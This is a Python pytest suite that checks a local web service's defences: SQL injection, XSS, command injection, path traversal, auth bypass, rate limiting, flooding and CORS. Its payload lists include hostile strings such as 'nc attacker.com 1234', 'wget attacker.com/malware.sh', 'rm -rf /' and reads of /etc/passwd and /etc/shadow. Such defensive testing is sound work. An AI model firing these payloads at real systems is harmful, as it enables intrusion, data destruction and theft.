#!/usr/bin/env python3
"""
Security Validation Integration Tests

Tests to verify security measures including authentication,
authorization, input validation, and protection against common attacks.
"""

import json
import time
import hashlib
import secrets
import pytest
import requests
import websocket
import logging
from typing import Dict, Any, Optional
import subprocess
import base64

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class SecurityTester:
    """Security testing utilities"""
    
    def __init__(self):
        self.base_url = "http://localhost:9501"
        self.ws_url = "ws://localhost:3002"
        self.tcp_port = 9500
        
    def generate_token(self, secret: str = "test-secret") -> str:
        """Generate test authentication token"""
        timestamp = str(int(time.time()))
        data = f"{timestamp}:{secret}"
        return base64.b64encode(hashlib.sha256(data.encode()).digest()).decode()
        
    def test_injection_attack(self, payload: str, endpoint: str) -> Dict[str, Any]:
        """Test injection attack prevention"""
        try:
            response = requests.post(
                f"{self.base_url}{endpoint}",
                json={"data": payload},
                timeout=5
            )
            return {
                "status_code": response.status_code,
                "blocked": response.status_code in [400, 403],
                "response": response.text[:200]
            }
        except Exception as e:
            return {"error": str(e), "blocked": True}
            
    def test_rate_limiting(self, endpoint: str, requests_count: int = 20) -> Dict[str, Any]:
        """Test rate limiting"""
        results = []
        
        for i in range(requests_count):
            try:
                start = time.time()
                response = requests.get(f"{self.base_url}{endpoint}", timeout=2)
                duration = time.time() - start
                
                results.append({
                    "request": i,
                    "status": response.status_code,
                    "duration": duration
                })
                
                if response.status_code == 429:
                    logger.info(f"Rate limited at request {i}")
                    break
                    
            except Exception as e:
                results.append({
                    "request": i,
                    "error": str(e)
                })
                
        return {
            "total_requests": len(results),
            "rate_limited": any(r.get("status") == 429 for r in results),
            "results": results
        }
        
    def test_auth_bypass(self, endpoint: str) -> bool:
        """Test authentication bypass attempts"""
        bypass_attempts = [
            # No auth header
            {},
            # Empty auth
            {"Authorization": ""},
            # Invalid format
            {"Authorization": "InvalidToken"},
            # SQL injection in auth
            {"Authorization": "' OR '1'='1"},
            # JWT manipulation attempt
            {"Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ."},
        ]
        
        for headers in bypass_attempts:
            try:
                response = requests.get(
                    f"{self.base_url}{endpoint}",
                    headers=headers,
                    timeout=5
                )
                
                # Should be unauthorized
                if response.status_code not in [401, 403]:
                    logger.error(f"Auth bypass succeeded with headers: {headers}")
                    return False
                    
            except Exception as e:
                logger.info(f"Auth bypass blocked: {e}")
                
        return True

class TestSecurityValidation:
    """Security Validation Test Suite"""
    
    @pytest.fixture
    def security_tester(self):
        """Create security tester instance"""
        return SecurityTester()
        
    def test_sql_injection_prevention(self, security_tester):
        """Test SQL injection prevention"""
        sql_payloads = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM passwords--",
            "1; DELETE FROM data WHERE '1'='1"
        ]
        
        for payload in sql_payloads:
            result = security_tester.test_injection_attack(payload, "/api/query")
            assert result["blocked"] == True, f"SQL injection not blocked: {payload}"
            
        logger.info("All SQL injection attempts blocked")
        
    def test_xss_prevention(self, security_tester):
        """Test XSS attack prevention"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'></iframe>",
            "'><script>alert(String.fromCharCode(88,83,83))</script>"
        ]
        
        for payload in xss_payloads:
            result = security_tester.test_injection_attack(payload, "/api/content")
            
            # Check if response is sanitized
            if result.get("status_code") == 200:
                assert "<script>" not in result.get("response", "")
                assert "javascript:" not in result.get("response", "")
                
        logger.info("XSS prevention validated")
        
    def test_command_injection_prevention(self, security_tester):
        """Test command injection prevention"""
        cmd_payloads = [
            "; cat /etc/passwd",
            "| nc attacker.com 1234",
            "`rm -rf /`",
            "$( wget attacker.com/malware.sh )",
            "& ping -c 10 attacker.com &"
        ]
        
        for payload in cmd_payloads:
            result = security_tester.test_injection_attack(payload, "/api/process")
            assert result["blocked"] == True, f"Command injection not blocked: {payload}"
            
        logger.info("Command injection prevention verified")
        
    def test_path_traversal_prevention(self, security_tester):
        """Test path traversal attack prevention"""
        path_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/var/www/../../etc/shadow",
            "....//....//etc/hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        for payload in path_payloads:
            try:
                response = requests.get(
                    f"{security_tester.base_url}/api/file",
                    params={"path": payload},
                    timeout=5
                )
                
                # Should be blocked
                assert response.status_code in [400, 403, 404]
                
            except Exception as e:
                logger.info(f"Path traversal blocked: {e}")
                
        logger.info("Path traversal prevention verified")
        
    def test_rate_limiting_enforcement(self, security_tester):
        """Test rate limiting is enforced"""
        # Test API endpoint rate limiting
        result = security_tester.test_rate_limiting("/api/data", requests_count=50)
        
        assert result["rate_limited"] == True, "Rate limiting not enforced"
        assert result["total_requests"] < 50, "Too many requests allowed"
        
        logger.info(f"Rate limited after {result['total_requests']} requests")
        
    def test_authentication_required(self, security_tester):
        """Test authentication is required for protected endpoints"""
        protected_endpoints = [
            "/api/admin",
            "/api/user/profile",
            "/api/settings",
            "/api/secure-data"
        ]
        
        for endpoint in protected_endpoints:
            try:
                response = requests.get(
                    f"{security_tester.base_url}{endpoint}",
                    timeout=5
                )
                
                # Should require authentication
                assert response.status_code in [401, 403], f"Endpoint {endpoint} not protected"
                
            except Exception as e:
                logger.info(f"Endpoint {endpoint} properly protected: {e}")
                
        logger.info("All protected endpoints require authentication")
        
    def test_auth_bypass_prevention(self, security_tester):
        """Test authentication bypass prevention"""
        assert security_tester.test_auth_bypass("/api/secure") == True
        logger.info("Authentication bypass prevention verified")
        
    def test_websocket_security(self, security_tester):
        """Test WebSocket security measures"""
        # Test without authentication
        try:
            ws = websocket.create_connection(security_tester.ws_url, timeout=5)
            
            # Try to send privileged command
            ws.send(json.dumps({
                "type": "admin_command",
                "action": "get_all_users"
            }))
            
            response = ws.recv()
            data = json.loads(response)
            
            # Should be rejected
            assert data.get("error") is not None or data.get("unauthorized") == True
            
            ws.close()
            
        except Exception as e:
            logger.info(f"WebSocket security test: {e}")
            
    def test_input_validation(self, security_tester):
        """Test input validation"""
        invalid_inputs = [
            {"data": None},
            {"data": "x" * 10000},  # Very long string
            {"data": {"nested": {"too": {"deep": {"for": {"safety": "test"}}}}}},
            {"data": ["a"] * 1000},  # Large array
            {"number": "not-a-number"},
            {"email": "invalid-email"},
            {"url": "javascript:alert(1)"}
        ]
        
        for payload in invalid_inputs:
            try:
                response = requests.post(
                    f"{security_tester.base_url}/api/validate",
                    json=payload,
                    timeout=5
                )
                
                # Should validate input
                assert response.status_code in [400, 422], f"Invalid input accepted: {payload}"
                
            except Exception as e:
                logger.info(f"Input validation working: {e}")
                
        logger.info("Input validation verified")
        
    def test_secure_headers(self, security_tester):
        """Test security headers are present"""
        try:
            response = requests.get(security_tester.base_url, timeout=5)
            headers = response.headers
            
            # Check security headers
            security_headers = {
                "X-Content-Type-Options": "nosniff",
                "X-Frame-Options": ["DENY", "SAMEORIGIN"],
                "X-XSS-Protection": "1; mode=block",
                "Strict-Transport-Security": None,  # Optional for HTTPS
                "Content-Security-Policy": None  # Optional but recommended
            }
            
            for header, expected_values in security_headers.items():
                if header in headers:
                    if expected_values:
                        assert headers[header] in expected_values, f"Invalid {header} value"
                    logger.info(f"Security header present: {header} = {headers[header]}")
                elif expected_values:  # Required header missing
                    logger.warning(f"Missing security header: {header}")
                    
        except Exception as e:
            logger.error(f"Security headers test failed: {e}")
            
    def test_dos_protection(self, security_tester):
        """Test DoS protection mechanisms"""
        # Test large payload rejection
        large_payload = {"data": "x" * (1024 * 1024 * 10)}  # 10MB
        
        try:
            response = requests.post(
                f"{security_tester.base_url}/api/data",
                json=large_payload,
                timeout=5
            )
            
            # Should reject large payload
            assert response.status_code in [413, 400], "Large payload not rejected"
            
        except Exception as e:
            logger.info(f"Large payload rejected: {e}")
            
        # Test connection flooding protection
        import concurrent.futures
        
        def make_request():
            try:
                return requests.get(f"{security_tester.base_url}/api/data", timeout=1)
            except:
                return None
                
        # Try to flood with connections
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(make_request) for _ in range(100)]
            results = [f.result() for f in concurrent.futures.as_completed(futures, timeout=10)]
            
        # Should have blocked some requests
        blocked_count = sum(1 for r in results if r is None or (r and r.status_code == 429))
        assert blocked_count > 0, "No requests were blocked during flood"
        
        logger.info(f"DoS protection active: {blocked_count} requests blocked")
        
    def test_secret_exposure(self, security_tester):
        """Test for secret/credential exposure"""
        endpoints_to_check = [
            "/api/config",
            "/api/environment",
            "/api/debug",
            "/api/status",
            "/.env",
            "/config.json"
        ]
        
        sensitive_patterns = [
            "password",
            "secret",
            "api_key",
            "private_key",
            "token",
            "DATABASE_URL",
            "AWS_SECRET"
        ]
        
        for endpoint in endpoints_to_check:
            try:
                response = requests.get(
                    f"{security_tester.base_url}{endpoint}",
                    timeout=5
                )
                
                if response.status_code == 200:
                    content = response.text.lower()
                    
                    for pattern in sensitive_patterns:
                        assert pattern.lower() not in content, f"Potential secret exposure at {endpoint}: {pattern}"
                        
            except Exception as e:
                logger.info(f"Endpoint {endpoint} protected: {e}")
                
        logger.info("No secret exposure detected")
        
    def test_cors_configuration(self, security_tester):
        """Test CORS configuration"""
        # Test preflight request
        response = requests.options(
            f"{security_tester.base_url}/api/data",
            headers={
                "Origin": "http://evil.com",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Content-Type"
            },
            timeout=5
        )
        
        # Check CORS headers
        cors_headers = response.headers
        
        if "Access-Control-Allow-Origin" in cors_headers:
            # Should not allow all origins
            assert cors_headers["Access-Control-Allow-Origin"] != "*", "CORS allows all origins"
            logger.info(f"CORS configured: {cors_headers['Access-Control-Allow-Origin']}")
        else:
            logger.info("CORS not enabled or properly restricted")

if __name__ == "__main__":
    # Run tests
    pytest.main([__file__, "-v", "-s"])